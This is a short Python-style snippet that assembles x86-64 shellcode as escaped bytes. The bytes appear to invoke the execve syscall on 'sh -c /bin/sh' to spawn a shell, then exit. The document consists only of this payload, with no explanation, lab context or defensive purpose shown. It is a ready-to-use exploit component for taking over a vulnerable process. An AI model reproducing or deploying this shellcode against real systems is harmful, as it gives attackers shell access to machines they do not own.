shellcode = ""
shellcode += "\xEB\x45\x41\x5C\x6A\x00\x4C\x89\xE0\xEB\x04\x48\x83\xC0\x01\x80"
shellcode += "\x38\x00\x74\x0C\x50\x80\x38\x00\x74\xF1\x48\x83\xC0\x01\xEB\xF5"
shellcode += "\x6A\x00\x48\x89\xE2\x48\x8D\x74\x24\x08\x48\x8B\x3E\x48\xC7\xC0"
shellcode += "\x3B\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC0"
shellcode += "\x3C\x00\x00\x00\x0F\x05\xF4\xE8\xB6\xFF\xFF\xFF"
shellcode += "sh\x00"
shellcode += "-c\x00"
shellcode += "/bin/sh\x00\x00"